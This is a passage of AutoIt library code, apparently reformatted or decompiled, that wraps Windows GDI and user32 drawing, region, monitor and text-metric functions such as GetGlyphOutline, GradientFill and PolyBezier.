        Local $tgm = DllStructCreate($TAGGLYPHMETRICS)
        Local $acall, $ilength = 0x0
        If Not IsDllStruct($tmat2) Then
            $tmat2 = DllStructCreate("short[8]")
            DllStructSetData($tmat2, 0x1, 0x1, 0x2)
            DllStructSetData($tmat2, 0x1, 0x1, 0x8)
        EndIf
        If $iformat Then
            $acall = DllCall("gdi32.dll", "dword", "GetGlyphOutlineW", "handle", $hdc, "uint", AscW($schar), "uint", $iformat, "struct*", $tgm, "dword", 0x0, "ptr", 0x0, "struct*", $tmat2)
            If @error Or ($acall[0x0] = -1) Then Return SetError(@error + 0xa, @extended, 0x0)
            $ilength = $acall[0x0]
            $pbuffer = __HeapReAlloc($pbuffer, $ilength, 0x1)
            If @error Then Return SetError(@error + 0x14, @extended, 0x0)
        EndIf
        $acall = DllCall("gdi32.dll", "dword", "GetGlyphOutlineW", "handle", $hdc, "uint", AscW($schar), "uint", $iformat, "struct*", $tgm, "dword", $ilength, "ptr", $pbuffer, "struct*", $tmat2)
        If @error Then Return SetError(@error, @extended, 0x0)
        If $acall[0x0] = -1 Then Return SetError(0xa, + -1, 0x0)
        Return SetExtended($ilength, $tgm)
    EndFunc    ; -> _WinAPI_GetGlyphOutline

    Func _WinAPI_GetGraphicsMode($hdc)
        Local $acall = DllCall("gdi32.dll", "int", "GetGraphicsMode", "handle", $hdc)
        If @error Or Not $acall[0x0] Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_GetGraphicsMode

    Func _WinAPI_GetGValue($irgb)
        Return BitShift(BitAND(__rgb($irgb), 0xff00), 0x8)
    EndFunc    ; -> _WinAPI_GetGValue

    Func _WinAPI_GetMapMode($hdc)
        Local $acall = DllCall("gdi32.dll", "int", "GetMapMode", "handle", $hdc)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_GetMapMode

    Func _WinAPI_GetMonitorInfo($hmonitor)
        Local $tmiex = DllStructCreate("dword;long[4];long[4];dword;wchar[32]")
        DllStructSetData($tmiex, 0x1, DllStructGetSize($tmiex))
        Local $acall = DllCall("user32.dll", "bool", "GetMonitorInfoW", "handle", $hmonitor, "struct*", $tmiex)
        If @error Or Not $acall[0x0] Then Return SetError(@error + 0xa, @extended, 0x0)
        Local $aret[0x4]
        For $i = 0x0 To 0x1
            $aret[$i] = DllStructCreate($TAGRECT)
            _WinAPI_MoveMemory($aret[$i], DllStructGetPtr($tmiex, $i + 0x2), 0x10)
        Next
        $aret[0x3] = DllStructGetData($tmiex, 0x5)
        Switch DllStructGetData($tmiex, 0x4)
        Case 0x1
            $aret[0x2] = 0x1
        Case Else
            $aret[0x2] = 0x0
        EndSwitch
        Return $aret
    EndFunc    ; -> _WinAPI_GetMonitorInfo

    Func _WinAPI_GetOutlineTextMetrics($hdc)
        Local $acall = DllCall("gdi32.dll", "uint", "GetOutlineTextMetricsW", "handle", $hdc, "uint", 0x0, "ptr", 0x0)
        If @error Or Not $acall[0x0] Then Return SetError(@error + 0xa, @extended, 0x0)
        Local $tdata = DllStructCreate("byte[" & $acall[0x0] & "]")
        Local $toltm = DllStructCreate($TAGOUTLINETEXTMETRIC, DllStructGetPtr($tdata))
        $acall = DllCall("gdi32.dll", "uint", "GetOutlineTextMetricsW", "handle", $hdc, "uint", $acall[0x0], "struct*", $tdata)
        If Not $acall[0x0] Then Return SetError(0x14, 0x0, 0x0)
        Return $toltm
    EndFunc    ; -> _WinAPI_GetOutlineTextMetrics

    Func _WinAPI_GetPixel($hdc, $ix, $iy)
        Local $acall = DllCall("gdi32.dll", "dword", "GetPixel", "handle", $hdc, "int", $ix, "int", $iy)
        If @error Or ($acall[0x0] = -1) Then Return SetError(@error, @extended, + -1)
        Return __rgb($acall[0x0])
    EndFunc    ; -> _WinAPI_GetPixel

    Func _WinAPI_GetPolyFillMode($hdc)
        Local $acall = DllCall("gdi32.dll", "int", "GetPolyFillMode", "handle", $hdc)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_GetPolyFillMode

    Func _WinAPI_GetPosFromRect($trect)
        Local $aret[0x4]
        For $i = 0x0 To 0x3
            $aret[$i] = DllStructGetData($trect, $i + 0x1)
            If @error Then Return SetError(@error, @extended, 0x0)
        Next
        For $i = 0x2 To 0x3
            $aret[$i]-= $aret[$i + -2]
        Next
        Return $aret
    EndFunc    ; -> _WinAPI_GetPosFromRect

    Func _WinAPI_GetRegionData($hrgn, ByRef $trgndata)
        Local $acall = DllCall("gdi32.dll", "dword", "GetRegionData", "handle", $hrgn, "dword", 0x0, "ptr", 0x0)
        If @error Or Not $acall[0x0] Then
            $trgndata = 0x0
            Return SetError(@error, @extended, False)
        EndIf
        $trgndata = DllStructCreate($TAGRGNDATAHEADER)
        Local $irectsize = $acall[0x0] - DllStructGetSize($trgndata)
        If $irectsize > 0x0 Then $trgndata = DllStructCreate($TAGRGNDATAHEADER & ";byte[" & $irectsize & "]")
        $acall = DllCall("gdi32.dll", "dword", "GetRegionData", "handle", $hrgn, "dword", $acall[0x0], "struct*", $trgndata)
        If Not $acall[0x0] Then $trgndata = 0x0
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_GetRegionData

    Func _WinAPI_GetRgnBox($hrgn, ByRef $trect)
        $trect = DllStructCreate($TAGRECT)
        Local $acall = DllCall("gdi32.dll", "int", "GetRgnBox", "handle", $hrgn, "struct*", $trect)
        If @error Or Not $acall[0x0] Then
            $trect = 0x0
            Return SetError(@error, @extended, 0x0)
        EndIf
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_GetRgnBox

    Func _WinAPI_GetROP2($hdc)
        Local $acall = DllCall("gdi32.dll", "int", "GetROP2", "handle", $hdc)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_GetROP2

    Func _WinAPI_GetRValue($irgb)
        Return BitAND(__rgb($irgb), 0xff)
    EndFunc    ; -> _WinAPI_GetRValue

    Func _WinAPI_GetStretchBltMode($hdc)
        Local $acall = DllCall("gdi32.dll", "int", "GetStretchBltMode", "handle", $hdc)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_GetStretchBltMode

    Func _WinAPI_GetTabbedTextExtent($hdc, $stext, $atab = 0x0, $ISTART = 0x0, $IEND = + -1)
        Local $itab, $icount
        If Not IsArray($atab) Then
            If $atab Then
                $itab = $atab
                Dim $atab[0x1] = [$itab]
                $ISTART = 0x0
                $IEND = 0x0
                $icount = 0x1
            Else
                $icount = 0x0
            EndIf
        Else
            $icount = 0x1
        EndIf
        Local $ttab = 0x0
        If $icount Then
            If __CheckErrorArrayBounds($atab, $ISTART, $IEND) Then Return SetError(@error + 0xa, @extended, 0x0)
            $icount = $IEND - $ISTART + 0x1
            $ttab = DllStructCreate("uint[" & $icount & "]")
            $itab = 0x1
            For $i = $ISTART To $IEND
                DllStructSetData($ttab, 0x1, $atab[$i], $itab)
                $itab += 0x1
            Next
        EndIf
        Local $acall = DllCall("user32.dll", "dword", "GetTabbedTextExtentW", "handle", $hdc, "wstr", $stext, "int", StringLen($stext), "int", $icount, "struct*", $ttab)
        If @error Or Not $acall[0x0] Then Return SetError(@error + 0x14, @extended, 0x0)
        Return _WinAPI_CreateSize(_WinAPI_LoWord($acall[0x0]), _WinAPI_HiWord($acall[0x0]))
    EndFunc    ; -> _WinAPI_GetTabbedTextExtent

    Func _WinAPI_GetTextAlign($hdc)
        Local $acall = DllCall("gdi32.dll", "uint", "GetTextAlign", "handle", $hdc)
        If @error Or ($acall[0x0] = -1) Then Return SetError(@error, @extended, + -1)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_GetTextAlign

    Func _WinAPI_GetTextCharacterExtra($hdc)
        Local $acall = DllCall("gdi32.dll", "int", "GetTextCharacterExtra", "handle", $hdc)
        If @error Or ($acall[0x0] = 0x8000000) Then Return SetError(@error, @extended, + -1)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_GetTextCharacterExtra

    Func _WinAPI_GetTextFace($hdc)
        Local $acall = DllCall("gdi32.dll", "int", "GetTextFaceW", "handle", $hdc, "int", 0x800, "wstr", '')
        If @error Or Not $acall[0x0] Then Return SetError(@error + 0xa, @extended, '')
        Return $acall[0x3]
    EndFunc    ; -> _WinAPI_GetTextFace

    Func _WinAPI_GetUDFColorMode()
        Return Number($__g_irgbmode)
    EndFunc    ; -> _WinAPI_GetUDFColorMode

    Func _WinAPI_GetUpdateRect($hwnd, $berase = True)
        Local $trect = DllStructCreate($TAGRECT)
        Local $acall = DllCall("user32.dll", "bool", "GetUpdateRect", "hwnd", $hwnd, "struct*", $trect, "bool", $berase)
        If @error Or Not $acall[0x0] Then Return SetError(@error + 0xa, @extended, 0x0)
        Return $trect
    EndFunc    ; -> _WinAPI_GetUpdateRect

    Func _WinAPI_GetUpdateRgn($hwnd, $hrgn, $berase = True)
        Local $acall = DllCall("user32.dll", "int", "GetUpdateRgn", "hwnd", $hwnd, "handle", $hrgn, "bool", $berase)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_GetUpdateRgn

    Func _WinAPI_GetWindowExt($hdc)
        Local $tsize = DllStructCreate($TAGSIZE)
        Local $acall = DllCall("gdi32.dll", "bool", "GetWindowExtEx", "handle", $hdc, "struct*", $tsize)
        If @error Or Not $acall[0x0] Then Return SetError(@error + 0xa, @extended, 0x0)
        Return $tsize
    EndFunc    ; -> _WinAPI_GetWindowExt

    Func _WinAPI_GetWindowOrg($hdc)
        Local $tpoint = DllStructCreate($TAGPOINT)
        Local $acall = DllCall("gdi32.dll", "bool", "GetWindowOrgEx", "handle", $hdc, "struct*", $tpoint)
        If @error Or Not $acall[0x0] Then Return SetError(@error + 0xa, @extended, 0x0)
        Return $tpoint
    EndFunc    ; -> _WinAPI_GetWindowOrg

    Func _WinAPI_GetWindowRgnBox($hwnd, ByRef $trect)
        $trect = DllStructCreate($TAGRECT)
        Local $acall = DllCall("gdi32.dll", "int", "GetWindowRgnBox", "hwnd", $hwnd, "struct*", $trect)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_GetWindowRgnBox

    Func _WinAPI_GetWorldTransform($hdc)
        Local $txform = DllStructCreate($TAGXFORM)
        Local $acall = DllCall("gdi32.dll", "bool", "GetWorldTransform", "handle", $hdc, "struct*", $txform)
        If @error Or Not $acall[0x0] Then Return SetError(@error + 0xa, @extended, 0x0)
        Return $txform
    EndFunc    ; -> _WinAPI_GetWorldTransform

    Func _WinAPI_GradientFill($hdc, Const ByRef $AVERTEX, $ISTART = 0x0, $IEND = + -1, $BROTATE = False)
        If __CheckErrorArrayBounds($AVERTEX, $ISTART, $IEND, 0x2) Then Return SetError(@error + 0xa, @extended, 0x0)
        If UBound($AVERTEX, $UBOUND_COLUMNS) < 0x3 Then Return SetError(0xd, 0x0, 0x0)
        Local $ipoint = $IEND - $ISTART + 0x1
        If $ipoint > 0x3 Then
            $IEND = $ISTART + 0x2
            $ipoint = 0x3
        EndIf
        Local $imode
        Switch $ipoint
        Case 0x2
            $imode = Number(Not $BROTATE)
        Case 0x3
            $imode = 0x2
        Case Else
            Return SetError(0xf, 0x0, 0x0)
        EndSwitch
        Local $tagstruct = ''
        For $i = $ISTART To $IEND
            $tagstruct &= "ushort[8];"
        Next
        Local $tvertex = DllStructCreate($tagstruct)
        Local $icount = 0x1
        Local $tgradient = DllStructCreate("ulong[" & $ipoint & "]")
        For $i = $ISTART To $IEND
            DllStructSetData($tgradient, 0x1, $icount + -1, $icount)
            DllStructSetData($tvertex, $icount, _WinAPI_LoWord($AVERTEX[$i][0x0]), 0x1)
            DllStructSetData($tvertex, $icount, _WinAPI_HiWord($AVERTEX[$i][0x0]), 0x2)
            DllStructSetData($tvertex, $icount, _WinAPI_LoWord($AVERTEX[$i][0x1]), 0x3)
            DllStructSetData($tvertex, $icount, _WinAPI_HiWord($AVERTEX[$i][0x1]), 0x4)
            DllStructSetData($tvertex, $icount, BitShift(_WinAPI_GetRValue($AVERTEX[$i][0x2]), + -8), 0x5)
            DllStructSetData($tvertex, $icount, BitShift(_WinAPI_GetGValue($AVERTEX[$i][0x2]), + -8), 0x6)
            DllStructSetData($tvertex, $icount, BitShift(_WinAPI_GetBValue($AVERTEX[$i][0x2]), + -8), 0x7)
            DllStructSetData($tvertex, $icount, 0x0, 0x8)
            $icount += 0x1
        Next
        Local $acall = DllCall("gdi32.dll", "bool", "GdiGradientFill", "handle", $hdc, "struct*", $tvertex, "ulong", $ipoint, "struct*", $tgradient, "ulong", 0x1, "ulong", $imode)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_GradientFill

    Func _WinAPI_InflateRect(ByRef $trect, $idx, $idy)
        Local $acall = DllCall("user32.dll", "bool", "InflateRect", "struct*", $trect, "int", $idx, "int", $idy)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_InflateRect

    Func _WinAPI_IntersectClipRect($hdc, $trect)
        Local $acall = DllCall("gdi32.dll", "int", "IntersectClipRect", "handle", $hdc, "int", DllStructGetData($trect, 0x1), "int", DllStructGetData($trect, 0x2), "int", DllStructGetData($trect, 0x3), "int", DllStructGetData($trect, 0x4))
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_IntersectClipRect

    Func _WinAPI_IntersectRect($trect1, $trect2)
        Local $trect = DllStructCreate($TAGRECT)
        Local $acall = DllCall("user32.dll", "bool", "IntersectRect", "struct*", $trect, "struct*", $trect1, "struct*", $trect2)
        If @error Or Not $acall[0x0] Then Return SetError(@error + 0xa, @extended, 0x0)
        Return $trect
    EndFunc    ; -> _WinAPI_IntersectRect

    Func _WinAPI_InvalidateRgn($hwnd, $hrgn = 0x0, $berase = True)
        Local $acall = DllCall("user32.dll", "bool", "InvalidateRgn", "hwnd", $hwnd, "handle", $hrgn, "bool", $berase)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_InvalidateRgn

    Func _WinAPI_InvertANDBitmap($hbitmap, $bdelete = False)
        Local $tbitmap = DllStructCreate($TAGBITMAP)
        If Not _WinAPI_GetObject($hbitmap, DllStructGetSize($tbitmap), $tbitmap) Or (DllStructGetData($tbitmap, "bmBitsPixel") <> 0x1) Then
            Return SetError(@error + 0xa, @extended, 0x0)
        EndIf
        Local $hresult = _WinAPI_CreateDIB(DllStructGetData($tbitmap, "bmWidth"), DllStructGetData($tbitmap, "bmHeight"), 0x1)
        If Not $hresult Then Return SetError(@error, @extended, 0x0)
        Local $hsrcdc = _WinAPI_CreateCompatibleDC(0x0)
        Local $hsrcsv = _WinAPI_SelectObject($hsrcdc, $hbitmap)
        Local $hdstdc = _WinAPI_CreateCompatibleDC(0x0)
        Local $hdstsv = _WinAPI_SelectObject($hdstdc, $hresult)
        _WinAPI_BitBlt($hdstdc, 0x0, 0x0, DllStructGetData($tbitmap, "bmWidth"), DllStructGetData($tbitmap, "bmHeight"), $hsrcdc, 0x0, 0x0, 0x330008)
        _WinAPI_SelectObject($hsrcdc, $hsrcsv)
        _WinAPI_DeleteDC($hsrcdc)
        _WinAPI_SelectObject($hdstdc, $hdstsv)
        _WinAPI_DeleteDC($hdstdc)
        If $bdelete Then
            _WinAPI_DeleteObject($hbitmap)
        EndIf
        Return $hresult
    EndFunc    ; -> _WinAPI_InvertANDBitmap

    Func _WinAPI_InvertColor($icolor)
        If $icolor = + -1 Then Return 0x0
        Return 0xffffff - BitAND($icolor, 0xffffff)
    EndFunc    ; -> _WinAPI_InvertColor

    Func _WinAPI_InvertRect($hdc, ByRef $trect)
        Local $acall = DllCall("user32.dll", "bool", "InvertRect", "handle", $hdc, "struct*", $trect)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_InvertRect

    Func _WinAPI_InvertRgn($hdc, $hrgn)
        Local $acall = DllCall("gdi32.dll", "bool", "InvertRgn", "handle", $hdc, "handle", $hrgn)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_InvertRgn

    Func _WinAPI_IsRectEmpty(ByRef $trect)
        Local $acall = DllCall("user32.dll", "bool", "IsRectEmpty", "struct*", $trect)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_IsRectEmpty

    Func _WinAPI_LineDDA($ix1, $iy1, $ix2, $iy2, $plineproc, $pdata = 0x0)
        Local $acall = DllCall("gdi32.dll", "bool", "LineDDA", "int", $ix1, "int", $iy1, "int", $ix2, "int", $iy2, "ptr", $plineproc, "lparam", $pdata)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_LineDDA

    Func _WinAPI_LineTo($hdc, $ix, $iy)
        Local $acall = DllCall("gdi32.dll", "bool", "LineTo", "handle", $hdc, "int", $ix, "int", $iy)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_LineTo

    Func _WinAPI_LockWindowUpdate($hwnd)
        Local $acall = DllCall("user32.dll", "bool", "LockWindowUpdate", "hwnd", $hwnd)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_LockWindowUpdate

    Func _WinAPI_LPtoDP($hdc, ByRef $tpoint, $icount = 0x1)
        Local $acall = DllCall("gdi32.dll", "bool", "LPtoDP", "handle", $hdc, "struct*", $tpoint, "int", $icount)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_LPtoDP

    Func _WinAPI_MaskBlt($hdestdc, $ixdest, $iydest, $iwidth, $iheight, $hsrcdc, $ixsrc, $iysrc, $hmask, $ixmask, $iymask, $irop)
        Local $acall = DllCall("gdi32.dll", "bool", "MaskBlt", "handle", $hdestdc, "int", $ixdest, "int", $iydest, "int", $iwidth, "int", $iheight, "hwnd", $hsrcdc, "int", $ixsrc, "int", $iysrc, "handle", $hmask, "int", $ixmask, "int", $iymask, "dword", $irop)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_MaskBlt

    Func _WinAPI_ModifyWorldTransform($hdc, ByRef $txform, $imode)
        Local $acall = DllCall("gdi32.dll", "bool", "ModifyWorldTransform", "handle", $hdc, "struct*", $txform, "dword", $imode)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_ModifyWorldTransform

    Func _WinAPI_MonitorFromPoint(ByRef $tpoint, $iflag = 0x1)
        If DllStructGetSize($tpoint) <> 0x8 Then Return SetError(@error + 0xa, @extended, 0x0)
        Local $acall = DllCall("user32.dll", "handle", "MonitorFromPoint", "struct", $tpoint, "dword", $iflag)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_MonitorFromPoint

    Func _WinAPI_MonitorFromRect(ByRef $trect, $iflag = 0x1)
        Local $acall = DllCall("user32.dll", "ptr", "MonitorFromRect", "struct*", $trect, "dword", $iflag)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_MonitorFromRect

    Func _WinAPI_MonitorFromWindow($hwnd, $iflag = 0x1)
        Local $acall = DllCall("user32.dll", "handle", "MonitorFromWindow", "hwnd", $hwnd, "dword", $iflag)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_MonitorFromWindow

    Func _WinAPI_MoveTo($hdc, $ix, $iy)
        Local $acall = DllCall("gdi32.dll", "bool", "MoveToEx", "handle", $hdc, "int", $ix, "int", $iy, "ptr", 0x0)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_MoveTo

    Func _WinAPI_MoveToEx($hdc, $ix, $iy)
        Local $tpoint = DllStructCreate($TAGPOINT)
        Local $acall = DllCall("gdi32.dll", "bool", "MoveToEx", "handle", $hdc, "int", $ix, "int", $iy, "struct*", $tpoint)
        If @error Or Not $acall[0x0] Then Return SetError(@error + 0xa, @extended, 0x0)
        Return $tpoint
    EndFunc    ; -> _WinAPI_MoveToEx

    Func _WinAPI_OffsetClipRgn($hdc, $ixoffset, $iyoffset)
        Local $acall = DllCall("gdi32.dll", "int", "OffsetClipRgn", "handle", $hdc, "int", $ixoffset, "int", $iyoffset)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_OffsetClipRgn

    Func _WinAPI_OffsetPoints(ByRef $APOINT, $ixoffset, $iyoffset, $ISTART = 0x0, $IEND = + -1)
        If __CheckErrorArrayBounds($APOINT, $ISTART, $IEND, 0x2) Then Return SetError(@error + 0xa, @extended, 0x0)
        If UBound($APOINT, $UBOUND_COLUMNS) < 0x2 Then Return SetError(0xd, 0x0, 0x0)
        For $i = $ISTART To $IEND
            $APOINT[$i][0x0]+= $ixoffset
            $APOINT[$i][0x1]+= $iyoffset
        Next
        Return 0x1
    EndFunc    ; -> _WinAPI_OffsetPoints

    Func _WinAPI_OffsetRect(ByRef $trect, $idx, $idy)
        Local $acall = DllCall("user32.dll", "bool", "OffsetRect", "struct*", $trect, "int", $idx, "int", $idy)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_OffsetRect

    Func _WinAPI_OffsetRgn($hrgn, $ixoffset, $iyoffset)
        Local $acall = DllCall("gdi32.dll", "int", "OffsetRgn", "handle", $hrgn, "int", $ixoffset, "int", $iyoffset)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_OffsetRgn

    Func _WinAPI_OffsetWindowOrg($hdc, $ixoffset, $iyoffset)
        $__g_vext = DllStructCreate($TAGPOINT)
        Local $acall = DllCall("gdi32.dll", "bool", "OffsetWindowOrgEx", "handle", $hdc, "int", $ixoffset, "int", $iyoffset, "struct*", $__g_vext)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_OffsetWindowOrg

    Func _WinAPI_PaintDesktop($hdc)
        Local $acall = DllCall("user32.dll", "bool", "PaintDesktop", "handle", $hdc)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_PaintDesktop

    Func _WinAPI_PaintRgn($hdc, $hrgn)
        Local $acall = DllCall("gdi32.dll", "bool", "PaintRgn", "handle", $hdc, "handle", $hrgn)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_PaintRgn

    Func _WinAPI_PatBlt($hdc, $ix, $iy, $iwidth, $iheight, $irop)
        Local $acall = DllCall("gdi32.dll", "bool", "PatBlt", "handle", $hdc, "int", $ix, "int", $iy, "int", $iwidth, "int", $iheight, "dword", $irop)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_PatBlt

    Func _WinAPI_PathToRegion($hdc)
        Local $acall = DllCall("gdi32.dll", "handle", "PathToRegion", "handle", $hdc)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_PathToRegion

    Func _WinAPI_PlayEnhMetaFile($hdc, $hemf, ByRef $trect)
        Local $acall = DllCall("gdi32.dll", "bool", "PlayEnhMetaFile", "handle", $hdc, "handle", $hemf, "struct*", $trect)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_PlayEnhMetaFile

    Func _WinAPI_PlgBlt($hdestdc, Const ByRef $APOINT, $hsrcdc, $ixsrc, $iysrc, $iwidth, $iheight, $hmask = 0x0, $ixmask = 0x0, $iymask = 0x0)
        If (UBound($APOINT) < 0x3) Or (UBound($APOINT, $UBOUND_COLUMNS) < 0x2) Then Return SetError(0xc, 0x0, False)
        Local $tpoints = DllStructCreate("long[2];long[2];long[2]")
        For $i = 0x0 To 0x2
            For $j = 0x0 To 0x1
                DllStructSetData($tpoints, $i + 0x1, $APOINT[$i][$j], $j + 0x1)
            Next
        Next
        Local $acall = DllCall("gdi32.dll", "bool", "PlgBlt", "handle", $hdestdc, "struct*", $tpoints, "handle", $hsrcdc, "int", $ixsrc, "int", $iysrc, "int", $iwidth, "int", $iheight, "handle", $hmask, "int", $ixmask, "int", $iymask)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_PlgBlt

    Func _WinAPI_PolyBezier($hdc, Const ByRef $APOINT, $ISTART = 0x0, $IEND = + -1)
        If __CheckErrorArrayBounds($APOINT, $ISTART, $IEND, 0x2, 0x2) Then Return SetError(@error + 0xa, @extended, False)
        Local $ipoint = 0x1 + 0x3 * Floor(($IEND - $ISTART) / 0x3)
        If $ipoint < 0x1 Then Return SetError(0xf, 0x0, False)
        $IEND = $ISTART + $ipoint + -1
        Local $tagstruct = ''
        For $i = $ISTART To $IEND
            $tagstruct &= "long[2];"
        Next
        Local $tpoint = DllStructCreate($tagstruct)
        Local $icount = 0x0
        For $i = $ISTART To $IEND
            $icount += 0x1
            For $j = 0x0 To 0x1
                DllStructSetData($tpoint, $icount, $APOINT[$i][$j], $j + 0x1)
            Next
        Next
        Local $acall = DllCall("gdi32.dll", "bool", "PolyBezier", "handle", $hdc, "struct*", $tpoint, "dword", $ipoint)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_PolyBezier

    Func _WinAPI_PolyBezierTo($hdc, Const ByRef $APOINT, $ISTART = 0x0, $IEND = + -1)
        If __CheckErrorArrayBounds($APOINT, $ISTART, $IEND, 0x2, 0x2) Then Return SetError(@error + 0xa, @extended, False)
        Local $ipoint = 0x3 * Floor(($IEND - $ISTART + 0x1) / 0x3)
        If $ipoint < 0x3 Then Return SetError(0xf, 0x0, False)
        $IEND = $ISTART + $ipoint + -1
        Local $tagstruct = ''
        For $i = $ISTART To $IEND
            $tagstruct &= "long[2];"
        Next
        Local $tpoint = DllStructCreate($tagstruct)
        Local $icount = 0x0
        For $i = $ISTART To $IEND
            $icount += 0x1
            For $j = 0x0 To 0x1
                DllStructSetData($tpoint, $icount, $APOINT[$i][$j], $j + 0x1)
            Next
        Next
        Local $acall = DllCall("gdi32.dll", "bool", "PolyBezierTo", "handle", $hdc, "struct*", $tpoint, "dword", $ipoint)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_PolyBezierTo

    Func _WinAPI_PolyDraw($hdc, Const ByRef $APOINT, $ISTART = 0x0, $IEND = + -1)
        If __CheckErrorArrayBounds($APOINT, $ISTART, $IEND, 0x2) Then Return SetError(@error + 0xa, @extended, 0x0)
        If UBound($APOINT, $UBOUND_COLUMNS) < 0x3 Then Return SetError(0xd, 0x0, False)
        Local $ipoint = $IEND - $ISTART + 0x1
        Local $tagstruct = ''
        For $i = $ISTART To $IEND
            $tagstruct &= "long[2];"
        Next
        Local $tpoint = DllStructCreate($tagstruct)
        Local $ttypes = DllStructCreate("byte[" & $ipoint & "]")
        Local $icount = 0x0
        For $i = $ISTART To $IEND
            $icount += 0x1
            For $j = 0x0 To 0x1
                DllStructSetData($tpoint, $icount, $APOINT[$i][$j], $j + 0x1)
            Next
            DllStructSetData($ttypes, 0x1, $APOINT[$i][0x2], $icount)
        Next
        Local $acall = DllCall("gdi32.dll", "bool", "PolyDraw", "handle", $hdc, "struct*", $tpoint, "struct*", $ttypes, "dword", $ipoint)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_PolyDraw

    Func _WinAPI_Polygon($hdc, Const ByRef $APOINT, $ISTART = 0x0, $IEND = + -1)
        If __CheckErrorArrayBounds($APOINT, $ISTART, $IEND, 0x2, 0x2) Then Return SetError(@error + 0xa, @extended, False)
        Local $tagstruct = ''
        For $i = $ISTART To $IEND
            $tagstruct &= "int[2];"
        Next
        Local $tdata = DllStructCreate($tagstruct)
        Local $icount = 0x1
        For $i = $ISTART To $IEND
            For $j = 0x0 To 0x1
                DllStructSetData($tdata, $icount, $APOINT[$i][$j], $j + 0x1)
            Next
            $icount += 0x1
        Next
        Local $acall = DllCall("gdi32.dll", "bool", "Polygon", "handle", $hdc, "struct*", $tdata, "int", $icount + -1)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_Polygon

    Func _WinAPI_PtInRectEx($ix, $iy, $ileft, $itop, $iright, $ibottom)
        Local $trect = _WinAPI_CreateRect($ileft, $itop, $iright, $ibottom)
        Local $tpoint = _WinAPI_CreatePoint($ix, $iy)
        Local $acall = DllCall("user32.dll", "bool", "PtInRect", "struct*", $trect, "struct", $tpoint)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_PtInRectEx

    Func _WinAPI_PtInRegion($hrgn, $ix, $iy)
        Local $acall = DllCall("gdi32.dll", "bool", "PtInRegion", "handle", $hrgn, "int", $ix, "int", $iy)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_PtInRegion

    Func _WinAPI_PtVisible($hdc, $ix, $iy)
        Local $acall = DllCall("gdi32.dll", "bool", "PtVisible", "handle", $hdc, "int", $ix, "int", $iy)
